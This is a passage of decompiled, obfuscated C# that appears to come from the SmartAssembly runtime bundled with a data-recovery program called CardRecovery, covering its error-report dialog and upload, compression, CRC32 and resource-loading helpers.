			Type[] types = Assembly.GetExecutingAssembly().GetTypes();
			foreach (Type type in types)
			{
				if ((object)type == null || (object)type.BaseType == null || (object)type.BaseType != typeof(Class37))
				{
					continue;
				}
				try
				{
					Class37.class37_0 = (Class37)Activator.CreateInstance(type, nonPublic: true);
					if (Class37.class37_0 != null)
					{
						break;
					}
				}
				catch
				{
				}
			}
		}
		return Class37.class37_0;
	}

	static bool smethod_173(bool bool_0, Class14.Class23 class23_0, bool bool_1)
	{
		bool flag;
		do
		{
			Class25.smethod_87(class23_0);
			bool bool_2 = bool_0 && class23_0.int_7 == class23_0.int_8;
			flag = Class25.smethod_218(bool_1, bool_2, class23_0);
		}
		while (Class25.smethod_130(class23_0.class24_0) && flag);
		return flag;
	}

	static void smethod_174(int int_0, AppDomain appDomain_0, int int_1, string string_0, object object_0)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 15:
				appDomain_0.SetData(string_0, object_0);
				return;
			}
		}
	}

	static object smethod_175(AppDomain appDomain_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 69:
				return appDomain_0.GetData(string_0);
			}
			int num = 3;
		}
	}

	static byte[] smethod_176(MemoryStream memoryStream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 67:
				return memoryStream_0.ToArray();
			}
			int num = 5;
		}
	}

	[DllImport("kernel32.Dll")]
	static extern short GetVersionEx(ref Class40.Struct12 struct12_0);

	static int smethod_177(Class14.Class18 class18_0, Class14.Class16 class16_0)
	{
		int num;
		int num2;
		if ((num = Class25.smethod_147(class16_0, 9)) >= 0)
		{
			if ((num2 = class18_0.short_0[num]) >= 0)
			{
				Class25.smethod_123(class16_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class25.smethod_147(class16_0, int_)) >= 0)
			{
				num2 = class18_0.short_0[num3 | (num >> 9)];
				Class25.smethod_123(class16_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num4 = Class25.smethod_62(class16_0);
			num = Class25.smethod_147(class16_0, num4);
			num2 = class18_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= num4)
			{
				Class25.smethod_123(class16_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int num5 = Class25.smethod_62(class16_0);
		num = Class25.smethod_147(class16_0, num5);
		num2 = class18_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= num5)
		{
			Class25.smethod_123(class16_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static bool smethod_178(Class14.Class21 class21_0)
	{
		return class21_0.int_1 >= 16384;
	}

	static int smethod_179(Class14.Class23 class23_0)
	{
		int num = ((class23_0.int_0 << 5) ^ class23_0.byte_0[class23_0.int_4 + 2]) & 0x7FFF;
		short num2 = (class23_0.short_1[class23_0.int_4 & 0x7FFF] = class23_0.short_0[num]);
		class23_0.short_0[num] = (short)class23_0.int_4;
		class23_0.int_0 = num;
		return num2 & 0xFFFF;
	}

	static byte[] smethod_180(byte[] byte_0)
	{
		return Class25.smethod_226(1, (byte[])null, (byte[])null, byte_0);
	}

	static string smethod_181()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static byte[] smethod_182(Encoding encoding_0, string string_0, int int_0, int int_1)
	{
		int num = 9;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 49:
				num = 0;
				num2 = 0;
				break;
			default:
				num = 7;
				num2 = 6;
				break;
			}
			int num3 = num2;
			num = 1;
			switch (num3)
			{
			default:
				num = 11;
				goto IL_0039;
			case 2:
				num = 11;
				goto IL_0039;
			case 3:
				num = 2;
				goto IL_0053;
			case 4:
				num = 9;
				continue;
			case 6:
				num = 12;
				num3 = 5;
				num = 1;
				goto case 5;
			case 7:
				num = 2;
				goto IL_0053;
			case 5:
				num = 9;
				continue;
			case 0:
				num = 4;
				break;
			case 1:
				{
					num = 4;
					break;
				}
				IL_0053:
				num3 = 5;
				num = 1;
				goto case 5;
				IL_0039:
				num3 = 5;
				num = 1;
				goto case 5;
			}
			break;
		}
		return Class25.smethod_113(encoding_0, string_0, 870, 805);
	}

	static void smethod_183(string string_0, byte[] byte_0, Delegate2 delegate2_0, Class39 class39_0, string string_1, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class39_0.string_2);
			if (class39_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class39_0.iwebProxy_0);
			}
			delegate2_0(reportingService.UploadReport2(class39_0.string_1, byte_0, string_1, string_0, string_2));
		}
		catch (Exception ex)
		{
			delegate2_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_184(Class14.Class20 class20_0)
	{
		if (class20_0.int_0 == 30)
		{
			return Class25.smethod_130(class20_0.class24_0);
		}
		return false;
	}

	static bool smethod_185(Class14.Class20 class20_0)
	{
		return Class25.smethod_243(class20_0.class23_0);
	}

	static bool smethod_186(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_2;
	}

	static string smethod_187()
	{
		return Class25.smethod_200().string_0;
	}

	static long smethod_188(Class14.Class20 class20_0)
	{
		return class20_0.long_0;
	}

	static bool smethod_189(string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 77:
				return File.Exists(string_0);
			}
			int num = 1;
		}
	}

	static void smethod_190(Class36 class36_0)
	{
		try
		{
			Graphics val = ((Control)class36_0).CreateGraphics();
			try
			{
				string text = ((Control)class36_0).get_Text();
				Font font = ((Control)class36_0).get_Font();
				int width = ((Control)class36_0).get_Width();
				int num = Class25.smethod_24(text, font, width, val);
				if (num > 0)
				{
					((Control)class36_0).set_Height(num);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_191(Class28 class28_0, IWebProxy iwebProxy_0)
	{
		class28_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_192(Class14.Class21 class21_0)
	{
		class21_0.int_1 = 0;
		class21_0.int_2 = 0;
	}

	static void smethod_193(Form0 form0_0)
	{
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		((Control)form0_0.panel_0).SuspendLayout();
		((Control)form0_0.panel_1).SuspendLayout();
		((Control)form0_0).SuspendLayout();
		Class25.smethod_42(form0_0.control1_0, Enum1.const_1);
		Class25.smethod_42(form0_0.control1_1, Enum1.const_1);
		((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
		((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
		((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
		((Control)form0_0.checkBox_0).set_TabIndex(13);
		((Control)form0_0.checkBox_0).set_Text("Ignore this error and attempt to &continue.");
		form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
		((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
		form0_0.label_0.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_0).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)form0_0.label_0).set_Location(new Point(20, 124));
		((Control)form0_0.label_0).set_Size(new Size(381, 16));
		((Control)form0_0.label_0).set_Text(string.Format("Please tell {0} about this problem.", "WinRecovery Software"));
		((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_0).set_Size(new Size(75, 24));
		((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
		((Control)form0_0.button_0).set_TabIndex(4);
		((Control)form0_0.button_0).set_Text("&Don't Send");
		((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
		((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_1).set_Size(new Size(105, 24));
		((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
		((Control)form0_0.button_1).set_TabIndex(3);
		((Control)form0_0.button_1).set_Text("&Send Error Report");
		((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
		((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_6).set_Size(new Size(64, 24));
		((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
		((Control)form0_0.button_6).set_TabIndex(14);
		((Control)form0_0.button_6).set_Text("De&bug");
		((Control)form0_0.button_6).set_Visible(false);
		((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
		((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
		form0_0.label_1.set_FlatStyle((FlatStyle)3);
		((Control)form0_0.label_1).set_Location(new Point(20, 140));
		((Control)form0_0.label_1).set_Size(new Size(381, 55));
		((Control)form0_0.label_1).set_Text(string.Format("To help improve the software you use, {0} is interested in learning more about this error. We have created a report about the error for you to send to us.", "WinRecovery Software"));
		((Control)form0_0.class36_0).set_Anchor((AnchorStyles)13);
		((Control)form0_0.class36_0).set_Location(new Point(20, 69));
		((Control)form0_0.class36_0).set_Size(new Size(381, 13));
		((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_2).set_Size(new Size(80, 24));
		((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
		((Control)form0_0.button_2).set_TabIndex(7);
		((Control)form0_0.button_2).set_Text("&Cancel");
		((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
		((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
		((Control)form0_0.button_3).set_Enabled(false);
		((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_3).set_Size(new Size(105, 24));
		((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
		((Control)form0_0.button_3).set_TabIndex(6);
		((Control)form0_0.button_3).set_Text("&OK");
		((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
		((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_4).set_TabIndex(5);
		((Control)form0_0.button_4).set_Text("&Retry");
		((Control)form0_0.button_4).set_Visible(false);
		((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
		((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
		((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
		((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
		((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
		((Control)form0_0.button_5).set_TabIndex(5);
		((Control)form0_0.button_5).set_Text("Save Report");
		((Control)form0_0.button_5).set_Visible(false);
		((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
		((Control)form0_0.control3_0).set_Location(new Point(87, 146));
		((Control)form0_0.control3_0).set_Visible(false);
		((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
		((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
		((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
		((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
		((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
		((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
		{
			(Control)form0_0.button_6,
			(Control)form0_0.checkBox_0,
			(Control)form0_0.label_0,
			(Control)form0_0.button_0,
			(Control)form0_0.button_1,
			(Control)form0_0.label_1,
			(Control)form0_0.class36_0,
			form0_0.control1_0
		});
		((Control)form0_0.panel_0).set_Size(new Size(413, 240));
		((Control)form0_0.panel_0).set_TabIndex(0);
		((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
		{
			(Control)form0_0.button_2,
			(Control)form0_0.button_3,
			(Control)form0_0.button_4,
			(Control)form0_0.button_5,
			form0_0.control3_0,
			form0_0.control1_1,
			form0_0.control0_0,
			form0_0.control0_1,
			form0_0.control0_2,
			form0_0.control0_3
		});
		((Control)form0_0.panel_1).set_Size(new Size(413, 240));
		((Control)form0_0.panel_1).set_TabIndex(2);
		((Control)form0_0.panel_1).set_Visible(false);
		((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form0_0).set_ClientSize(new Size(434, 488));
		((Form)form0_0).set_ControlBox(false);
		((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
		{
			form0_0.control2_0,
			(Control)form0_0.panel_0,
			(Control)form0_0.panel_1
		});
		((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form0_0).set_ShowInTaskbar(false);
		((Form)form0_0).set_MinimizeBox(false);
		((Form)form0_0).set_MaximizeBox(false);
		((Form)form0_0).set_StartPosition((FormStartPosition)1);
		((Control)form0_0).set_Text("CardRecovery");
		if (((Control)form0_0).get_Text().Length == 0)
		{
			((Control)form0_0).set_Text("Error Reporting");
		}
		try
		{
			((Form)form0_0).set_TopMost(true);
		}
		catch
		{
		}
		((Control)form0_0.panel_0).ResumeLayout(false);
		((Control)form0_0.panel_1).ResumeLayout(false);
		((Control)form0_0).ResumeLayout(false);
		((Control)form0_0.button_4).BringToFront();
		((Control)form0_0.button_5).BringToFront();
		((Form)form0_0).set_Size(new Size(419, 264));
		((Control)form0_0.panel_1).set_Dock((DockStyle)5);
		((Control)form0_0.panel_0).set_Dock((DockStyle)5);
	}

	static string smethod_194(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static int smethod_195(Class14.Class17 class17_0)
	{
		return class17_0.int_1;
	}

	static void smethod_196(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class25.smethod_54(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_197(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class25.smethod_54(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static int smethod_198(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 69:
				return stream_0.Read(byte_0, int_0, int_1);
			}
			int num = 1;
		}
	}

	static void smethod_199(Array array_0, RuntimeFieldHandle runtimeFieldHandle_0, int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 66:
				RuntimeHelpers.InitializeArray(array_0, runtimeFieldHandle_0);
				return;
			}
			num = 4;
		}
	}

	static Class40.Struct12 smethod_200()
	{
		if (!Class40.bool_0)
		{
			Class40.struct12_0 = default(Class40.Struct12);
			try
			{
				Class40.struct12_0.int_0 = Marshal.SizeOf(typeof(Class40.Struct12));
				Class25.GetVersionEx(ref Class40.struct12_0);
				Class40.bool_0 = true;
			}
			catch
			{
			}
		}
		return Class40.struct12_0;
	}

	static int smethod_201(Array array_0, int int_0, int int_1, int int_2)
	{
		while (true)
		{
			switch (int_2 ^ int_1)
			{
			case 123:
				return array_0.GetLength(int_0);
			}
			int num = 7;
		}
	}

	static Assembly[] smethod_202(Class29 class29_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class25.smethod_68() };
		}
	}

	static int smethod_203(Random random_0, int int_0, int int_1, int int_2, int int_3)
	{
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 40:
				return random_0.Next(int_0, int_1);
			}
			int num = 7;
		}
	}

	static object smethod_204(int int_0, AppDomain appDomain_0, int int_1, string string_0)
	{
		while (true)
		{
			switch (int_0 ^ int_1)
			{
			case 9:
				return appDomain_0.GetData(string_0);
			}
		}
	}

	static int smethod_205(Class29 class29_0, Class29.Struct10 struct10_0)
	{
		string key = struct10_0.struct9_0.string_0.ToUpper();
		if (class29_0.dictionary_3.ContainsKey(key))
		{
			return class29_0.dictionary_3[key];
		}
		int count = class29_0.list_2.Count;
		class29_0.list_2.Add(struct10_0.struct9_0);
		class29_0.dictionary_3.Add(key, count);
		return count;
	}

	static void smethod_206(Exception exception_0, Class29 class29_0)
	{
		using (new Class41(class29_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class29_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class29_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class29_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class29_0.xmlWriter_0.WriteAttributeString("Method", text);
				class29_0.method_1(new Class33(exception_0, bool_1: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_207(Class14.Class21 class21_0)
	{
		for (int i = 0; i < class21_0.int_1; i++)
		{
			int num = class21_0.byte_1[i] & 0xFF;
			int num2 = class21_0.short_0[i];
			if (num2-- != 0)
			{
				int num3 = Class25.smethod_92(num, class21_0);
				Class25.smethod_221(class21_0.class22_0, num3);
				int num4 = (num3 - 261) / 4;
				if (num4 > 0 && num4 <= 5)
				{
					Class25.smethod_30(class21_0.class24_0, num & ((1 << num4) - 1), num4);
				}
				int num5 = Class25.smethod_32(class21_0, num2);
				Class25.smethod_221(class21_0.class22_1, num5);
				num4 = num5 / 2 - 1;
				if (num4 > 0)
				{
					Class25.smethod_30(class21_0.class24_0, num2 & ((1 << num4) - 1), num4);
				}
			}
			else
			{
				Class25.smethod_221(class21_0.class22_0, num);
			}
		}
		Class25.smethod_221(class21_0.class22_0, 256);
	}

	static object smethod_208(Class33 class33_0)
	{
		return class33_0.object_0;
	}

	static bool smethod_209()
	{
		return Class25.smethod_200().byte_0 == 1;
	}

	static bool smethod_210(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_0;
	}

	static void smethod_211(Class14.Class24 class24_0, int int_0)
	{
		class24_0.byte_0[class24_0.int_1++] = (byte)int_0;
		class24_0.byte_0[class24_0.int_1++] = (byte)(int_0 >> 8);
	}

	static Type smethod_212(RuntimeTypeHandle runtimeTypeHandle_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 124:
				return Type.GetTypeFromHandle(runtimeTypeHandle_0);
			}
			int num = 6;
		}
	}

	static long smethod_213(Stream stream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 38:
				return stream_0.Length;
			}
			int num = 2;
		}
	}

	static void smethod_214(Class37 class37_0, EventHandler eventHandler_0)
	{
		EventHandler eventHandler = class37_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class37_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static ICryptoTransform smethod_215(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static void smethod_216(Class29 class29_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class25.smethod_129(class29_0, tempFileName);
			string path = Class25.smethod_33();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class29_0.eventHandler_0 != null)
			{
				class29_0.eventHandler_0(class29_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception exception_)
		{
			Class25.smethod_112(class29_0, new EventArgs0(exception_));
		}
	}

	static void smethod_217(byte[] byte_0, short[] short_0, Class14.Class21.Class22 class22_0)
	{
		class22_0.short_1 = short_0;
		class22_0.byte_0 = byte_0;
	}

	static bool smethod_218(bool bool_0, bool bool_1, Class14.Class23 class23_0)
	{
		if (class23_0.int_5 < 262 && !bool_1)
		{
			return false;
		}
		Class14.Class21 class21_2;
		byte[] byte_;
		int int_4;
		do
		{
			if (class23_0.int_5 >= 262 || bool_1)
			{
				if (class23_0.int_5 != 0)
				{
					if (class23_0.int_4 >= 65274)
					{
						Class25.smethod_95(class23_0);
					}
					int int_ = class23_0.int_1;
					int int_2 = class23_0.int_2;
					if (class23_0.int_5 >= 3)
					{
						int num = Class25.smethod_179(class23_0);
						if (num != 0 && class23_0.int_4 - num <= 32506 && Class25.smethod_79(num, class23_0) && class23_0.int_2 <= 5 && class23_0.int_2 == 3 && class23_0.int_4 - class23_0.int_1 > 4096)
						{
							class23_0.int_2 = 2;
						}
					}
					if (int_2 >= 3 && class23_0.int_2 <= int_2)
					{
						Class14.Class21 class21_ = class23_0.class21_0;
						int int_3 = class23_0.int_4 - 1 - int_;
						Class25.smethod_170(int_2, int_3, class21_);
						int_2 -= 2;
						do
						{
							class23_0.int_4++;
							class23_0.int_5--;
							if (class23_0.int_5 >= 3)
							{
								Class25.smethod_179(class23_0);
							}
						}
						while (--int_2 > 0);
						class23_0.int_4++;
						class23_0.int_5--;
						class23_0.bool_0 = false;
						class23_0.int_2 = 2;
					}
					else
					{
						if (class23_0.bool_0)
						{
							Class25.smethod_28(class23_0.class21_0, class23_0.byte_0[class23_0.int_4 - 1] & 0xFF);
						}
						class23_0.bool_0 = true;
						class23_0.int_4++;
						class23_0.int_5--;
					}
					continue;
				}
				if (class23_0.bool_0)
				{
					Class25.smethod_28(class23_0.class21_0, class23_0.byte_0[class23_0.int_4 - 1] & 0xFF);
				}
				class23_0.bool_0 = false;
				class21_2 = class23_0.class21_0;
				byte_ = class23_0.byte_0;
				int_4 = class23_0.int_3;
				int int_5 = class23_0.int_4 - class23_0.int_3;
				Class25.smethod_148(int_5, class21_2, byte_, bool_0, int_4);
				class23_0.int_3 = class23_0.int_4;
				return false;
			}
			return true;
		}
		while (!Class25.smethod_178(class23_0.class21_0));
		int num2 = class23_0.int_4 - class23_0.int_3;
		if (class23_0.bool_0)
		{
			num2--;
		}
		bool flag = bool_0 && class23_0.int_5 == 0 && !class23_0.bool_0;
		class21_2 = class23_0.class21_0;
		byte_ = class23_0.byte_0;
		int_4 = class23_0.int_3;
		Class25.smethod_148(num2, class21_2, byte_, flag, int_4);
		class23_0.int_3 += num2;
		return !flag;
	}

	static void smethod_219(Class14.Class23 class23_0)
	{
		class23_0.int_0 = (class23_0.byte_0[class23_0.int_4] << 5) ^ class23_0.byte_0[class23_0.int_4 + 1];
	}

	static Stream smethod_220(Assembly assembly_0, string string_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 112:
				return assembly_0.GetManifestResourceStream(string_0);
			}
			int num = 5;
		}
	}

	static void smethod_221(Class14.Class21.Class22 class22_0, int int_0)
	{
		Class25.smethod_30(class22_0.class21_0.class24_0, class22_0.short_1[int_0] & 0xFFFF, (int)class22_0.byte_0[int_0]);
	}

	static void smethod_222(Class14.Class17 class17_0, int int_0, int int_1)
	{
		if ((class17_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class17_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class17_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class17_0.byte_0, num, class17_0.byte_0, class17_0.int_0, int_0);
				class17_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class17_0.byte_0[class17_0.int_0++] = class17_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class25.smethod_85(class17_0, num, int_0, int_1);
		}
	}

	static Assembly smethod_223(byte[] byte_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 125:
				return Assembly.Load(byte_0);
			}
			int num = 7;
		}
	}

	static AppDomain smethod_224(int int_0, int int_1)
	{
		int num = 5;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 109:
				num = 1;
				num2 = 6;
				break;
			default:
				num = 2;
				num2 = 3;
				break;
			}
			int num3 = num2;
			num = 12;
			switch (num3)
			{
			default:
				num = 3;
				goto IL_0048;
			case 0:
				num = 5;
				continue;
			case 3:
				num = 7;
				num3 = 1;
				num = 12;
				goto case 1;
			case 4:
				num = 0;
				goto IL_0051;
			case 5:
				num = 3;
				goto IL_0048;
			case 7:
				num = 0;
				goto IL_0051;
			case 1:
				num = 5;
				continue;
			case 2:
				num = 11;
				break;
			case 6:
				{
					num = 11;
					break;
				}
				IL_0051:
				num3 = 1;
				num = 12;
				goto case 1;
				IL_0048:
				num3 = 1;
				num = 12;
				goto case 1;
			}
			break;
		}
		return Class25.smethod_164(627, 521);
	}

	static void smethod_225(Class28 class28_0, Enum0 enum0_0)
	{
		Class25.smethod_128(class28_0, enum0_0, string.Empty);
	}

	static byte[] smethod_226(int int_0, byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			Class14.Stream0 stream = new Class14.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class14.Class20 class20_2 = new Class14.Class20();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
